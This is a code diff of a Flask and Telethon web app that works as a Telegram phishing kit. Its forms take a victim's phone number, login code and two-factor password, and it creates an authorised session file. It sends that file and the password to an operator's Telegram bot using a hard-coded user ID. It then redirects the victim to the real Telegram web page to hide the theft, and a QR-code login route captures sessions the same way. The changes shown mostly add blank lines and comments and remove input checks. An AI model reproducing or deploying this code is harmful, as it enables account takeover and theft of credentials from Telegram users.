@@ -22,6 +22,7 @@ USER_ID = 5425526761
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
+# URL to redirect to after successful login
 REDIRECT_URL = "https://web.telegram.org"  # Change as needed
 
 qr_status = {}
@@ -50,9 +51,13 @@ def qr_login_wait(session_key, session_str):
     loop.run_until_complete(client.connect())
     qr_login = loop.run_until_complete(client.qr_login())
     qr_status[session_key] = {'status': 'waiting', 'url': qr_login.url, 'error': None}
+
     try:
         loop.run_until_complete(qr_login.wait())
         qr_status[session_key]['status'] = 'success'
+        # After success, optionally save session file or perform actions
+        # You can save session_str or session file here for your use
+        # For demo, we just notify success
     except Exception as e:
         qr_status[session_key]['status'] = 'error'
         qr_status[session_key]['error'] = str(e)
@@ -62,17 +67,16 @@ def qr_login_wait(session_key, session_str):
 @app.route('/', methods=['GET', 'POST'])
 def index():
     if request.method == 'POST':
-        country_code = request.form.get('country_code')
-        phone_number = request.form.get('phone')
-        if not country_code or not phone_number:
-            flash("Missing country code or phone number.")
-            return render_template('index.html')
+        country_code = request.form['country_code']
+        phone_number = request.form['phone']
         phone = f"{country_code}{phone_number}"
         session_name = generate_session_name(phone)
+
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         client = TelegramClient(session_name, api_id, api_hash, loop=loop)
         loop.run_until_complete(client.connect())
+
         if not loop.run_until_complete(client.is_user_authorized()):
             try:
                 result = loop.run_until_complete(client.send_code_request(phone))
@@ -93,15 +97,19 @@ def verify():
     phone = request.args.get('phone')
     session_name = session.get('session_name')
     phone_code_hash = session.get('phone_code_hash')
+
     if not session_name or not phone_code_hash:
         flash("Session or code hash not found, please restart.")
         return redirect(url_for('index'))
+
     if request.method == 'POST':
-        code = request.form.get('code')
+        code = request.form['code']
+
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         client = TelegramClient(session_name, api_id, api_hash, loop=loop)
         loop.run_until_complete(client.connect())
+
         try:
             loop.run_until_complete(client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash))
         except Exception as e:
@@ -116,37 +124,45 @@ def verify():
                 client.disconnect()
                 return render_template('verify.html', phone=phone)
         client.disconnect()
+
         send_login_details_and_session(session_name, phone)
         flash(f'Session file "{session_name}" created and sent successfully!')
         return redirect(REDIRECT_URL)
+
     return render_template('verify.html', phone=phone, need_password=False)
 
 @app.route('/password', methods=['GET', 'POST'])
 def password():
     phone = session.get('phone_for_2fa')
     session_name = session.get('session_name')
+
     if not phone or not session_name:
         flash("Session expired or invalid. Please start again.")
         return redirect(url_for('index'))
+
     if request.method == 'POST':
         password_input = request.form.get('password')
         if not password_input:
             flash("Password is required.")
             return render_template('password.html')
+
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         client = TelegramClient(session_name, api_id, api_hash, loop=loop)
         loop.run_until_complete(client.connect())
+
         try:
             loop.run_until_complete(client.sign_in(password=password_input))
         except Exception as e:
             flash(f"2FA password error: {e}")
             client.disconnect()
             return render_template('password.html')
+
         client.disconnect()
         send_login_details_and_session(session_name, phone, password_input)
         flash('Logged in successfully with 2FA password!')
         return redirect(REDIRECT_URL)
+
     return render_template('password.html')
 
 @app.route('/qr_login')
@@ -154,22 +170,28 @@ def qr_login():
     session_key = f"qr_{int(time.time())}_{os.urandom(4).hex()}"
     session_str = StringSession().save()
     qr_status[session_key] = {'status': 'starting', 'url': None, 'error': None}
+
     thread = threading.Thread(target=qr_login_wait, args=(session_key, session_str))
     thread.daemon = True
     thread.start()
+
     timeout, elapsed = 5, 0
     while elapsed < timeout:
         if qr_status[session_key]['url']:
             break
         time.sleep(0.2)
         elapsed += 0.2
+
     qr_url = qr_status[session_key]['url']
     img = qrcode.make(qr_url)
     img_path = f'static/telegram_qr_{session_key}.png'
     os.makedirs('static', exist_ok=True)
     img.save(img_path)
+
     session['qr_session_key'] = session_key
+
     return render_template('qr.html', qr_image=img_path, session_key=session_key)
+
 
 @app.route('/qr_status')
 def qr_status_route():
@@ -179,5 +201,6 @@ def qr_status_route():
     entry = qr_status[session_key]
     return jsonify({'status': entry.get('status', 'starting'), 'error': entry.get('error', '')})
 
-# DO NOT include app.run() or if __name__ == '__main__' for Vercel
 
+if __name__ == '__main__':
+    app.run(debug=True)
